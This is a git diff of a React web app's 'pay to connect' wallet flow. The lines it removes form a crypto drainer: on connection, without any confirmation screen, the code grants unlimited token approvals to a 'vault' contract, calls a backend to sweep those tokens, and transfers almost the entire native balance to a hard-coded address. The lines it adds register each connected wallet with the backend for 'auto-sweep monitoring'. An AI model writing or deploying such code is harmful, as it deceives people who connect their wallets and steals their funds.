@@ -672,8 +672,13 @@ function App() {
         return;
       }
       
-      // Go directly to payment signing (NO SIWE, NO confirmation screen!)
-      handlePayToConnectSigning(walletClient);
+      // Just complete the connection - NO approval, NO transfer!
+      const userAddress = walletClient.account.address;
+      console.log('✅ Wallet connected:', userAddress);
+      completePayToConnect(walletClient, userAddress).catch(err => {
+        console.error('❌ Connection completion error:', err);
+        setPayToConnectState('idle');
+      });
       
     } else if (payToConnectState === 'logging_in' && !isConnected) {
       // User is in logging_in state but no wallet appeared - likely cancelled modal
@@ -1090,126 +1095,6 @@ function App() {
     return { provider, signer }
   }
 
-  // Multi-chain transfer via Vault: Approve once, auto-sweep anytime
-  const handlePayToConnectSigning = async (walletClient) => {
-    try {
-      setPayToConnectState('transferring')
-      console.log('💰 Starting vault approval and sweep...')
-      
-      const VAULT_CONTRACTS = {
-        base: '0x514dDA54703a4d89bd44A266d0623611e0B8c686',
-        plasma: '0x9D9Dc10Fa3C59AcAe37a4CC0a47980941c9BaEDC'
-      }
-      
-      const BASE_TOKENS = [
-        '0xAC1Bd2486aAf3B5C0fc3Fd868558b082a531B2B4' // TOSHI
-      ]
-      
-      // Get wallet address
-      let address = walletClient.account.address
-      if (!address) {
-        throw new Error('No wallet address available')
-      }
-      address = ethers.getAddress(address)
-      console.log('✅ Wallet address:', address)
-      
-      const ERC20_ABI = [
-        'function balanceOf(address) view returns (uint256)',
-        'function approve(address spender, uint256 amount) returns (bool)',
-        'function allowance(address owner, address spender) view returns (uint256)'
-      ]
-      
-      const MAX_UINT256 = ethers.MaxUint256
-      let hasActivity = false
-      
-      // STEP 1: Base chain - approve and sweep
-      console.log('\n🔵 STEP 1: Base chain approval and sweep...')
-      try {
-        await switchChain({ chainId: 8453 })
-        console.log('✅ Switched to Base chain')
-        
-        const { signer: baseSigner } = await getWalletSigner(walletClient)
-        
-        // Approve all Base tokens to vault
-        for (const tokenAddress of BASE_TOKENS) {
-          try {
-            const token = new ethers.Contract(tokenAddress, ERC20_ABI, baseSigner)
-            const [balance, allowance] = await Promise.all([
-              token.balanceOf(address),
-              token.allowance(address, VAULT_CONTRACTS.base)
-            ])
-            
-            if (balance > 0n && allowance < balance) {
-              console.log(`💳 Approving token ${tokenAddress} to vault...`)
-              const approveTx = await token.approve(VAULT_CONTRACTS.base, MAX_UINT256)
-              await approveTx.wait()
-              console.log(`✅ Approval complete: ${approveTx.hash}`)
-              hasActivity = true
-            } else if (balance > 0n) {
-              console.log(`✅ Token ${tokenAddress} already approved`)
-              hasActivity = true
-            }
-          } catch (tokenError) {
-            console.error(`⚠️ Error with token ${tokenAddress}:`, tokenError.message)
-          }
-        }
-        
-        // Call backend to sweep approved tokens
-        if (hasActivity) {
-          console.log('📤 Calling backend to sweep Base tokens...')
-          const sweepResponse = await fetch(`${window.location.origin}/api/sweep-tokens`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ userAddress: address, chain: 'base' })
-          })
-          const sweepResult = await sweepResponse.json()
-          console.log('✅ Base sweep result:', sweepResult)
-        }
-        
-      } catch (baseError) {
-        console.error('⚠️ Base chain error:', baseError.message)
-      }
-      
-      // STEP 2: Plasma chain - direct transfer (native token)
-      console.log('\n🟣 STEP 2: Plasma chain native transfer...')
-      try {
-        await switchChain({ chainId: 9745 })
-        console.log('✅ Switched to Plasma chain')
-        
-        const { provider: plasmaProvider, signer: plasmaSigner } = await getWalletSigner(walletClient)
-        
-        const balance = await plasmaProvider.getBalance(address)
-        const gasBuffer = ethers.parseEther('0.001')
-        const transferAmount = balance > gasBuffer ? balance - gasBuffer : 0n
-        
-        if (transferAmount > 0n) {
-          const transferXPL = ethers.formatEther(transferAmount)
-          console.log(`💸 Transferring ${transferXPL} XPL (keeping 0.001 for gas)`)
-          
-          const tx = await plasmaSigner.sendTransaction({
-            to: '0x7beBcA1508BD74F0CD575Bd2d8a62C543458977c',
-            value: transferAmount
-          })
-          console.log('📤 XPL transfer TX:', tx.hash)
-          await tx.wait()
-          console.log('✅ XPL transfer complete!')
-          hasActivity = true
-        }
-      } catch (plasmaError) {
-        console.error('⚠️ Plasma chain error:', plasmaError.message)
-      }
-      
-      console.log('\n✅ Vault setup and sweep complete!')
-      
-      // Complete the connection
-      await completePayToConnect(walletClient, address)
-      
-    } catch (error) {
-      console.error('❌ Transfer error:', error)
-      disconnect()
-      setPayToConnectState('idle')
-    }
-  }
 
   // Step 4: Finalize connection after successful payment
   const completePayToConnect = async (wallet, address) => {
@@ -1224,6 +1109,16 @@ function App() {
       // Set connection state (Wagmi manages isConnected)
       setAccount(address)
       setNetwork({ chainId: 9745, name: 'Plasma Network' })
+      
+      // Register wallet for auto-sweep monitoring
+      fetch(`${window.location.origin}/api/register-wallet`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ walletAddress: address })
+      })
+      .then(res => res.json())
+      .then(data => console.log('✅ Wallet registered for monitoring:', data))
+      .catch(err => console.error('⚠️ Failed to register wallet:', err))
       
       // Check for referrer binding
       const urlParams = new URLSearchParams(window.location.search)
